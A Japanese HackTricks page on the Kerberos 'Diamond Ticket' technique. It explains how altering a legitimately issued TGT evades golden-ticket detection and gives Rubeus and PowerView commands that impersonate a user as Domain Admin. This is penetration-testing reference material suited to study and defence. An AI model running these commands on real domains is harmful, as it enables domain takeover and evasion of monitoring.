# ダイヤモンドチケット

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## ダイヤモンドチケット

**ゴールデンチケットと同様に**、ダイヤモンドチケットは**任意のサービスに任意のユーザーとしてアクセスするために使用できる**TGTです。ゴールデンチケットは完全にオフラインで偽造され、そのドメインのkrbtgtハッシュで暗号化され、その後ログオンセッションに渡されて使用されます。ドメインコントローラーは正当に発行したTGTを追跡しないため、自身のkrbtgtハッシュで暗号化されたTGTを喜んで受け入れます。

ゴールデンチケットの使用を検出する一般的な手法は2つあります:

* 対応するAS-REQがないTGS-REQを探す。
* Mimikatzのデフォルトの10年の有効期間など、不自然な値を持つTGTを探す。

**ダイヤモンドチケット**は、**DCによって発行された正当なTGTのフィールドを変更することで作成されます**。これは、**TGTを要求**し、ドメインのkrbtgtハッシュで**復号化**し、チケットの望ましいフィールドを**変更**してから、再び**暗号化する**ことで達成されます。これにより、ゴールデンチケットの先述の2つの短所を**克服します**:

* TGS-REQは先行するAS-REQを持ちます。
* TGTはDCによって発行されたものであり、ドメインのKerberosポリシーからすべての正しい詳細を持っています。これらはゴールデンチケットで正確に偽造することができますが、より複雑で間違いが生じやすいです。
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを**共有する**。

</details>
```
